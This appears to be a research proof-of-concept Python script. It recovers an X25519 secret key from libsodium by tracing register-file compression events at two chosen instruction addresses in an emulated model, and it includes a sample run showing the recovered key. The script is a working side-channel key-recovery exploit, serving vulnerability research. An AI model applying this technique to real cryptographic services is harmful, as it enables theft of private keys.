#!/usr/bin/env python3
"""
david.mateos@AF-519:~/pandora_fuzzing_dev/revizor$ time ./src/attack_x25519_rfc0.py
Secret key: c5 3d 79 2d 7c de d6 ce e5 bb b7 4c 79 dc d0 48 e0 7c e9 34 a9 f0 dc 15 9d 1b f9 1a 46 14 8f 11

Recovered key: c0 3d 79 2d 7c de d6 ce e5 bb b7 4c 79 dc d0 48 e0 7c e9 34 a9 f0 dc 15 9d 1b f9 1a 46 14 8f 51
Secret key:    c5 3d 79 2d 7c de d6 ce e5 bb b7 4c 79 dc d0 48 e0 7c e9 34 a9 f0 dc 15 9d 1b f9 1a 46 14 8f 11


real    0m8,032s
user    0m7,670s
sys     0m0,459s
"""

import ctypes
import time
import random
import itertools
import subprocess
from attack_common import hexspaces, check_correct_file
from model import RegisterFileCompressionTracer, X86UnicornModel
from input_generator import X25519InputGenerator, Input
from interfaces import RawTrace

SECRET_KEY_LENGTH = X25519InputGenerator.SECRETKEYBYTES
PUBLIC_KEY_LENGTH = X25519InputGenerator.PUBLICKEYBYTES

class Service:
	"""
	This models a service that uses X25519 to calculate a shared secret key that
	could be later used to send messages to the attacker. It uses the service
	secret key and the attacker public key to compute the shared secret key. It
	assumes the attacker controls its public key and is able to observe register
	file compressions on 0 and get a trace of the PCs where they happened, using
	trace(). His goal is to leak the service secret key.
	"""
	def __init__(self):
		self.secret_key = random.randbytes(SECRET_KEY_LENGTH)
		self.model = X86UnicornModel("targets/libsodium", "crypto_box_beforenm")
		self.input_gen = X25519InputGenerator(self.model.STACK, self.model.STACK_SIZE)
		self.model.tracer = RegisterFileCompressionTracer([0])

	def trace(self, public_key: bytes) -> RawTrace:
		trace, _ = self.model.trace_test_case(self.input_gen.create_input(public_key, self.secret_key))
		return trace.trace

def get_random_public_key():
	c = ctypes.CDLL("targets/libsodium.so")
	pk = ctypes.create_string_buffer(PUBLIC_KEY_LENGTH)
	sk = ctypes.create_string_buffer(SECRET_KEY_LENGTH)
	c.crypto_box_keypair(pk, sk)
	return bytes(pk)

def main():
	check_correct_file("targets/libsodium")
	service = Service()
	print(f"Secret key: {hexspaces(service.secret_key)}\n")

	public_key = get_random_public_key()

	# Get the trace
	AND_PC = 0x417943 # x0 &= mask. Produces an observation when swap = 0. https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/include/sodium/private/ed25519_ref10_fe_51.h#L168
	SEPARATOR_PC = 0x41831c # a >> 51. Produces an observation every iteration. https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/include/sodium/private/ed25519_ref10_fe_51.h#L504
	trace = service.trace(public_key)

	pcs = [int(observation, 16) for observation in trace]
	pcs = [pc for pc in pcs if pc in [AND_PC, SEPARATOR_PC]]

	# Analyze the trace and get the bits of the key
	key_bits = [0] # pos 255 is 0
	while True:
		if pcs[0] == AND_PC:
			assert pcs[1] == AND_PC
			pcs = pcs[2:]
			swap = 0
		else:
			swap = 1
		if not pcs:
			# there's no separator after the last call to cswap, which happens
			# outside of the loop and we want to ignore
			break
		assert pcs[0] == SEPARATOR_PC
		pcs = pcs[1:]
		bit = key_bits[-1] ^ swap # swap = xor of current and prev bits
		key_bits.append(bit)
	assert len(key_bits) == 256

	# Get the key from the key bits
	key_bits = "".join([str(bit) for bit in key_bits])
	key = int(key_bits, 2)
	key = key.to_bytes(SECRET_KEY_LENGTH, "little")

	print(f"Recovered key: {hexspaces(key)}")
	print(f"Secret key:    {hexspaces(service.secret_key)}\n")

if __name__ == "__main__":
	main()